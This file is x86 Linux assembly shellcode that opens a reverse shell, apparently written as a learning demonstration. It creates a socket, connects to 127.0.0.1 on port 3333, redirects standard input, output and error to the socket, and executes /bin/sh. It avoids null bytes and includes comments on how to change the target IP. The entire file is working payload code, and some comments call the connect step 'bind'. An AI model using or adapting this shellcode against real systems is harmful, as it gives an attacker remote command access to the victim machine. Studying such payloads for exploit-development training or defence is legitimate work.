; shellcode.asm 
; Author: Mutti K
; Purpose: Demonstration of simple reverse shell
; Note: null values have been removed. 

global _start

section .text

_start:

	; socket()
    xor eax,eax ; zero out
    xor ebx,ebx ; zero out
    xor ecx,ecx ; zero out
	mov al, 0x66 ;socketcall()
	mov bl, 0x1 ; socket() socketcall() sub call number
    push ecx ; Param 3. Reverse order params onto stack
    push 0x1 ; Param 2
    push 0x2 ; Param 1
    mov ecx, esp ; store stack point of socket arguments
	int 0x80
    mov esi, eax ; store newly created socket file descriptor for later use
    
	; connect()
    xor eax,eax ; zero out
    xor ebx,ebx ; zero out
    xor ecx,ecx ; zero out
	mov al, 0x66 ;socketcall()
	mov bl, 0x3 ; bind() socketcall() sub call number
        ;Create structure on stack for param 2.
    push ecx ; bytes 16-12, not needed
    push ecx ; bytes 12-18, not needed
    ; Original example code had null bytes.
    ; IP address may contain 0 such as 10.0.0.1. Some arithmatic is required to avoid using zeros.
    ; e.g. ip address 127.0.0.1 in hex is 7f000001h, ffffffffh - 7f000001h = 80fffffeh.
    ; We can use ffffffffh - 80fffffe = 7f000001h to obtain 127.0.0.1
    ; push 0x0100007f ; bytes 8-4, connect to ip address 127.0.0.1. 127d 0d 0d 1d = reverse 01h 00h 00h 7fh
    mov ecx, 0xffffffff
    sub ecx, 0x80fffffe ; This value needs to change when the connect ip address changes
    bswap ecx ; Reverse order bytes for ip address
    push ecx
    push WORD 0x050d ; Port number to listen on 3333d d05h. Reverse byte order and in hex, bytes 4-2
    push WORD 0x02 ; AF_INET, bytes 2-0
    mov edi, esp ; store pointer to structure for param 2 of bind()
        ; Reverse order params for bind() onto stack
    push 0x10 ; Param 3 is length of param 2 structure
    push edi ; Param 2 pointer to structure
    push esi ; Param 1, socket file descriptor from socket() call
    mov ecx, esp ; store stack point of socket arguments
	int 0x80

	; dup2()
    xor eax,eax ; zero out
    xor ebx,ebx ; zero out
    xor ecx,ecx ; zero out
	mov al, 0x3f ; dup2()
    ;mov ecx, 0x0; oldfd, stdin. ECX already zeroed
    mov ebx, esi ; newfd, returned fd from socket()
	int 0x80

	; dup2()
    xor eax,eax ; zero out
    xor ebx,ebx ; zero out
    xor ecx,ecx ; zero out
	mov al, 0x3f ; dup2()
    mov cl, 0x1 ; oldfd, stdout
    mov ebx, esi ; newfd, returned fd from socket()
	int 0x80

	; dup2()
    xor eax,eax ; zero out
    xor ebx,ebx ; zero out
    xor ecx,ecx ; zero out
	mov al, 0x3f ; dup2()
    mov cl, 0x2 ; oldfd, stderror
    mov ebx, esi ; newfd, returned fd from socket()
	int 0x80

	; execve()
    xor eax,eax ; zero out
    xor ebx,ebx ; zero out
    xor ecx,ecx ; zero out
    xor edx,edx ; zero out
    ;mov edx, 0x0 ; Param 3, null. EDX already zeroed out
    ;mov ecx, 0x0 ; Param 2, null. ECX already zeroed out
    ;create string on stack /bin/sh
    push edx ; null terminate shell string
    push 0x68732f2f ; hs//
    push 0x6e69622f ; nib/
    mov ebx, esp ; Param 1 store pointer to string
	mov al, 0xb ; execve()
	int 0x80
